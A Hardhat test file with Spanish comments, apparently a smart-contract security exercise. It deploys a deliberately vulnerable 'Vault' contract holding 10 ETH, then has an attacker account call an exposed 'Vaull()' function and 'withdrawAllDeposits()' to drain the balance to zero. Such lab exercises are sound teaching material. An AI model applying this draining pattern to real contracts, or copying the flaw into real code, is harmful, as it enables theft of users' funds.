const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Ejercicio 1", function () {
  let deployer, atacante;

  beforeEach(async function () {
    [deployer, atacante] = await ethers.getSigners();

    // Deployamos el contrato vulnerable con la cuenta "deployer"
    const Vault = await ethers.getContractFactory("Vault", deployer);
    this.contrato = await Vault.deploy();

    // Deployer deposita 10 ETH
    await this.contrato.deposit({ value: ethers.utils.parseEther("10") });
    let balance = await ethers.provider.getBalance(this.contrato.address);
    expect(balance).to.eq(ethers.utils.parseEther("10"));
    console.log(
      `El balance inicial del contrato es: ${ethers.utils.formatUnits(
        balance,
        18
      )}`
    );
  });

  it("Ataque", async function () {
    await this.contrato.connect(atacante).Vaull();
    await this.contrato.connect(atacante).withdrawAllDeposits();
    let balance = await ethers.provider.getBalance(this.contrato.address);
    expect(balance).to.eq("0");
    console.log(`El balance final del contrato es: ${balance}`);
  });
});
